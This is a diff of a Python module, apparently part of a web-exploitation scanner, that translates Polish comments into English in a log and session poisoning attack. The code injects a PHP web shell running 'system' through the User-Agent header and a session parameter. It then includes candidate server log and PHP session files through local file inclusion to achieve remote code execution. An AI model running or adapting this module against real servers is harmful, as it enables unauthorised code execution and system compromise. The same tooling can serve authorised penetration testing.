@@ -1,10 +1,10 @@
-"""Log / session poisoning — dwufazowa technika RCE z CPTS.
+"""Log / session poisoning — two-phase RCE technique.
 
-Faza INJECT: wysyłamy żądanie z web-shellem w polu, które trafia do logu
-             (User-Agent -> access.log) lub do pliku sesji (?param -> sess_*).
-Faza INCLUDE: dołączamy ten log/sesję przez LFI i wywołujemy kod (marker).
+INJECT phase: send a request with a web shell in a field that ends up in
+              a log (User-Agent -> access.log) or a session file (?param -> sess_*).
+INCLUDE phase: include that log/session via LFI and trigger the code (marker).
 
-Wymaga, by aplikacja miała prawo odczytu danego logu (zależne od serwera).
+Requires the application to have read access to the given log (server-dependent).
 """
 from __future__ import annotations
 
@@ -17,7 +17,7 @@ from .base import BaseModule
 
 _WEBSHELL = f"<?php system('echo {RCE_MARKER}; id'); ?>"
 
-# Kandydaci na logi do dołączenia (Linux + Windows z materiału).
+# Candidate logs to include (Linux + Windows).
 _LOG_PATHS = [
     "/var/log/apache2/access.log", "/var/log/apache2/error.log",
     "/var/log/nginx/access.log", "/var/log/nginx/error.log",
@@ -28,29 +28,30 @@ _LOG_PATHS = [
     "C:/xampp/apache/logs/access.log", "C:/nginx/log/access.log",
 ]
 
-# Bazowe katalogi sesji PHP (nazwa pliku: sess_<PHPSESSID>).
+# Base PHP session directories (filename: sess_<PHPSESSID>).
 _SESSION_DIRS = ["/var/lib/php/sessions/", "C:/Windows/Temp/"]
 
 
 class LogPoisonModule(BaseModule):
     name = "log_poison"
-    description = "Log/session poisoning — INJECT web-shell, potem INCLUDE (2 fazy)"
+    description = "Log/session poisoning — INJECT web shell, then INCLUDE (2 phases)"
+    verifiable = False  # custom run(): needs the INJECT phase replayed too
 
     def payloads(self) -> Iterator[str]:
-        # Interfejs bazowy niewykorzystywany — mamy własne run() dwufazowe.
+        # Base interface unused — this module has its own two-phase run().
         yield from ()
 
     async def run(self, client: HttpClient) -> list[Finding]:
         findings: list[Finding] = []
 
-        # --- FAZA INJECT: zatruj access.log przez nagłówek User-Agent ---
+        # --- INJECT PHASE: poison access.log via the User-Agent header ---
         await client.send(
-            "/",  # dowolne żądanie; liczy się nagłówek trafiający do logu
+            "/",  # any request; what matters is the header landing in the log
             encoding=Encoding.NONE,
             extra_headers={"User-Agent": _WEBSHELL},
         )
 
-        # --- FAZA INCLUDE: dołącz każdy kandydujący log i sprawdź marker ---
+        # --- INCLUDE PHASE: include each candidate log and check for the marker ---
         for log in self._candidate_logs():
             resp = await client.send(log, encoding=Encoding.NONE)
             if self.cfg.verbose:
@@ -59,10 +60,10 @@ class LogPoisonModule(BaseModule):
             if f.confirmed:
                 findings.append(f)
 
-        # --- SESSION POISONING: zatruj ?param, potem dołącz plik sesji ---
+        # --- SESSION POISONING: poison ?param, then include the session file ---
         sessid = client.cfg.cookies.get("PHPSESSID")
         if sessid:
-            await client.send(_WEBSHELL, encoding=Encoding.URL)  # zapisze się w sesji
+            await client.send(_WEBSHELL, encoding=Encoding.URL)  # gets saved into the session
             for d in _SESSION_DIRS:
                 sess_path = f"{d}sess_{sessid}"
                 resp = await client.send(sess_path, encoding=Encoding.NONE)
